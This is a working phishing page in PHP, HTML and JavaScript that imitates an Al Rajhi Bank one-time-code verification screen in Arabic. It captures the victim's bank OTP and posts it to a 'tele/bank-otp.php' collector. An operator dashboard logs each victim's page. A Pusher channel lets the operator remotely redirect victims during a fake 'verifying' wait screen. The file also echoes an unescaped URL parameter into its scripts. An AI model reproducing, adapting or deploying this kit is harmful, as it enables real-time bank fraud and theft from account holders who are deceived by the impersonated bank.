<?php
session_start();

require_once 'dashboard/init.php';

// الحصول على user_id
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['user_session'])) {
    $userId = $_SESSION['user_session'];
    $_SESSION['current_user_id'] = $userId;
}

if (!$userId) {
    header('Location: register.php');
    exit;
}

// تحديث الصفحة الحالية
$User->updateUserCurrentPage($userId, 'bank-otp.php');
$User->updateUserMessage($userId, 'رمز تحقق بنك الراجحي');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>رمز التحقق - بنك الراجحي</title>
  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Almarai', sans-serif;
    }

    body {
      background: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      text-align: center;
    }

    .logo {
      width: 70px;
      margin-bottom: 30px;
    }

    .title {
      font-size: 24px;
      font-weight: 700;
      color: #0046AD;
      margin-bottom: 15px;
    }

    .description {
      font-size: 15px;
      color: #666;
      margin-bottom: 10px;
      line-height: 1.6;
    }

    .phone-number {
      font-weight: 700;
      color: #0046AD;
    }

    .otp-input-container {
      margin: 40px 0;
    }

    .otp-input {
      width: 100%;
      max-width: 280px;
      height: 70px;
      font-size: 32px;
      font-weight: 700;
      text-align: center;
      letter-spacing: 8px;
      border: 3px solid #e5e8ef;
      border-radius: 12px;
      background: #f6f7fa;
      color: #0046AD;
      transition: all 0.3s;
      font-family: 'Courier New', monospace;
    }

    .otp-input:focus {
      outline: none;
      border-color: #0046AD;
      background: #fff;
      box-shadow: 0 0 0 4px rgba(0, 70, 173, 0.1);
    }

    .otp-input.error {
      border-color: #d32f2f;
      animation: shake 0.5s;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
      20%, 40%, 60%, 80% { transform: translateX(8px); }
    }

    .char-count {
      margin-top: 10px;
      font-size: 13px;
      color: #999;
    }

    .char-count.active {
      color: #0046AD;
      font-weight: 600;
    }

    .error-message {
      color: #d32f2f;
      font-size: 14px;
      margin-top: 15px;
      display: none;
      font-weight: 600;
    }

    .error-message.show {
      display: block;
    }

    .submit-btn {
      width: 100%;
      padding: 16px;
      background: #e6eeff;
      color: #999;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: not-allowed;
      margin-top: 30px;
      transition: all 0.3s;
    }

    .submit-btn.active {
      background: #0046AD;
      color: #fff;
      cursor: pointer;
    }

    .submit-btn.active:hover {
      background: #003a8c;
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 70, 173, 0.3);
    }

    .resend-link {
      margin-top: 20px;
      font-size: 14px;
      color: #0046AD;
      text-decoration: none;
      font-weight: 600;
      display: inline-block;
    }

    .resend-link:hover {
      text-decoration: underline;
    }

    /* ============ صفحة الانتظار ============ */
    #loadingScreen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #fff;
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    #loadingScreen.show {
      display: flex;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 5px solid #e6eeff;
      border-top: 5px solid #0046AD;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 18px;
      font-weight: 700;
      color: #0046AD;
      margin-top: 15px;
    }

    .loading-subtext {
      font-size: 14px;
      color: #666;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container" id="otpContainer">
    <img src="img/alrajhibank-logo.webp" alt="Logo" class="logo">
    
    <div class="title">رمز التحقق</div>
    <p class="description">
      تم إرسال رمز التحقق إلى رقم هاتفك<br>
      <span class="phone-number">05xx xxx xxx</span>
    </p>
    <p class="description">يرجى إدخال الرمز للمتابعة </p>

    <form id="otpForm">
      <div class="otp-input-container">
        <input 
          type="text" 
          class="otp-input" 
          id="otpInput"
          placeholder="" 
          maxlength="6" 
          inputmode="numeric"
          pattern="[0-9]*"
          autocomplete="off">
        
      </div>

      <div class="error-message" id="errorMessage">الرمز غير صحيح</div>

      <button type="submit" class="submit-btn" id="submitBtn" disabled>تأكيد</button>
    </form>

    <a href="#" class="resend-link">إعادة إرسال الرمز</a>
  </div>

  <!-- ✅ شاشة الانتظار -->
  <div id="loadingScreen">
    <img src="img/alrajhibank-logo.webp" alt="Logo" style="width: 80px; margin-bottom: 30px;">
    <div class="spinner"></div>
    <div class="loading-text">جاري التحقق...</div>
    <div class="loading-subtext">يرجى الانتظار، لا تغلق الصفحة</div>
  </div>

<script>
    localStorage.setItem('current_user_id', '<?php echo $userId; ?>');

    const otpInput = document.getElementById('otpInput');
    const submitBtn = document.getElementById('submitBtn');
    const errorMessage = document.getElementById('errorMessage');
    const otpForm = document.getElementById('otpForm');

    // ✅ التركيز التلقائي على الحقل
    otpInput.focus();

    // ✅ منع أي حرف غير رقمي
    otpInput.addEventListener('input', function(e) {
      // السماح بالأرقام فقط
      this.value = this.value.replace(/[^0-9]/g, '');
      
      const length = this.value.length;
      
      // تفعيل الزر عند إدخال 4 أو 6 أرقام
      if (length === 4 || length === 6) {
        submitBtn.classList.add('active');
        submitBtn.disabled = false;
      } else {
        submitBtn.classList.remove('active');
        submitBtn.disabled = true;
      }
      
      // إخفاء رسالة الخطأ عند الكتابة
      errorMessage.classList.remove('show');
      otpInput.classList.remove('error');
    });

    // ✅ منع اللصق إلا للأرقام
    otpInput.addEventListener('paste', function(e) {
      e.preventDefault();
      const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').substring(0, 6);
      this.value = pastedData;
      
      // تشغيل event input يدوياً
      const event = new Event('input', { bubbles: true });
      this.dispatchEvent(event);
    });

    // ✅ إرسال النموذج
    otpForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const otpCode = otpInput.value.trim();
      
      // التحقق من أن الرمز 4 أو 6 أرقام
      if (otpCode.length !== 4 && otpCode.length !== 6) {
        errorMessage.textContent = 'يرجى إدخال 4 أو 6 أرقام';
        errorMessage.classList.add('show');
        otpInput.classList.add('error');
        return;
      }

      const formData = new FormData();
      formData.append('otp_code', otpCode);
      formData.append('user_id', '<?php echo $userId; ?>');

      try {
        const response = await fetch('tele/bank-otp.php', {
          method: 'POST',
          body: formData
        });

        const result = await response.json();

        if (result.success) {
          // ✅ إخفاء النموذج وإظهار شاشة الانتظار
          document.getElementById('otpContainer').style.display = 'none';
          document.getElementById('loadingScreen').classList.add('show');
          
          console.log('✅ تم إرسال رمز OTP البنك');
        } else {
          errorMessage.textContent = result.error || 'الرمز غير صحيح';
          errorMessage.classList.add('show');
          otpInput.classList.add('error');
          otpInput.value = '';
          otpInput.focus();
        }
      } catch (error) {
        console.error('خطأ:', error);
        errorMessage.textContent = 'حدث خطأ، يرجى المحاولة مرة أخرى';
        errorMessage.classList.add('show');
        otpInput.classList.add('error');
      }
    });

    // ✅ إرسال عند الضغط على Enter
    otpInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter' && (this.value.length === 4 || this.value.length === 6)) {
        otpForm.dispatchEvent(new Event('submit'));
      }
    });
  </script>

  <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
  <script>
    const pusher = new Pusher('a56388ee6222f6c5fb86', {
      cluster: 'ap2',
      encrypted: true
    });

    const channel = pusher.subscribe('my-channel');

    channel.bind('force-redirect-user', function(data) {
      const myId = localStorage.getItem('current_user_id');

      if (myId && data.userId == myId) {
        console.log('🔄 توجيه العميل إلى:', data.url);
        window.location.href = data.url;
      }
    });
  </script>
</body>
</html>
